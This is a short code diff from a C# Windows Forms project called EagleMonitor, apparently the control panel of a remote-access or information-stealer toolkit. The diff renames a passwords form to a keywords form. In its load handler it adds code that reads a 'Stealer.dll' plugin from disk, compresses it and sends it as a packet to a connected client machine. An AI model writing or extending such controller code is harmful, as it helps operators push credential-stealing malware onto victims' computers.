@@ -1,7 +1,10 @@
 ﻿using EagleMonitor.Controls;
 using EagleMonitor.Networking;
 using EagleMonitor.Utils;
+using PacketLib;
+using PacketLib.Packet;
 using System;
+using System.IO;
 using System.Windows.Forms;
 
 /* 
@@ -20,10 +23,18 @@ namespace EagleMonitor.Forms
             InitializeComponent();
         }
 
-        private void PasswordsForm_Load(object sender, EventArgs e)
+
+        private void KeywordsForm_Load(object sender, EventArgs e)
         {
             new Guna.UI2.WinForms.Helpers.DataGridViewScrollHelper(dataGridView1, guna2VScrollBar1, true);
             Miscellaneous.Enable(this.dataGridView1);
+
+            KeywordsPacket keywordsPacket = new KeywordsPacket
+            {
+                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
+            };
+
+            this.clientHandler.SendPacket(keywordsPacket);
         }
 
         private void closeButton_Click(object sender, EventArgs e)
